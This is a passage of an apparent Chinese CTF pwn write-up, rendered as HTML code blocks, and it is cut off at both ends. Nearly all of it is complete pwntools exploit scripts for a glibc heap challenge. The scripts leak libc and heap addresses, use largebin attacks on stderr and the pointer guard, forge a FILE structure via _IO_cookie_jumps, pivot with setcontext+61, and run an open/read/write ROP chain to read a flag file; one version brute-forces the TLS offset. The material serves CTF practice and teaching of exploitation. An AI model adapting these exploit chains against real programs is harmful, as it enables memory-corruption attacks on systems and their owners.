class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>根据setcontext+61，布置<code>rdx</code>周围，使寄存器满足条件</p><p><code>rsp</code>指向chunk 1，<code>rcx</code>指向ret，将栈迁移到chunk 1上</p><h3 id="orw-chain"><a href="#orw-chain" class="headerlink" title="orw chain"></a>orw chain</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *$rebase(0x1289)\nb *$rebase(0x1536)\nb *$rebase(0x15a4)\n *$rebase(0x13dd)\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line">tls_offset = <span class="number">0x3c0740</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line"><span class="comment">#size(0x40f,0x500]</span></span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">1</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">2</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span><span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">3</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, <span class="built_in">str</span></span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">4</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line">pl += <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendit</span>():</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;opcode\n&quot;</span>, pl)</span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + tls_offset + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger assert</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x500</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *$rebase(0x1289)\nb *$rebase(0x1536)\nb *$rebase(0x15a4)\n *$rebase(0x13dd)\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">offset = <span class="number">0x300740</span></span><br><span class="line">tls_offset = offset</span><br><span class="line">tls_offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">tls_offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;try offset:\t&quot;</span> + <span class="built_in">hex</span>(tls_offset))</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line"><span class="comment">#size(0x40f,0x500]</span></span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">1</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">2</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span><span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">3</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, <span class="built_in">str</span></span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">4</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line">pl += <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendit</span>():</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;opcode\n&quot;</span>, pl)</span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + tls_offset + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span 